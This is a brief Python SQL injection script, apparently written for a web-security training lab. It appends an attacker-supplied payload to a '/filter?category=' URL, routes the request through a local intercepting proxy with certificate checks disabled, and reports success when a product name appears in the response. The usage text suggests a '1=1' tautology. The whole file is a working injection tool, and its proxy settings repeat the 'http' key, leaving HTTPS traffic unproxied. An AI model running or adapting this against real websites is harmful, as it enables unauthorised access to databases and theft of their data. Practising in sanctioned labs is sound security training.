import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'http': 'http://127.0.0.1:8080'}


def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url+uri+payload, verify=False, proxies=proxies)

    if "Real Life Photoshopping" in r.text:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <payload>")
        print(f"[-] Example: {sys.argv[0]} http://example.com '1=1'")
        sys.exit(-1)
    if exploit_sqli(url, payload):
        print("[+] SQL Injection successful")
    else:
        print("[-] SQL Injection Unsuccessful!")
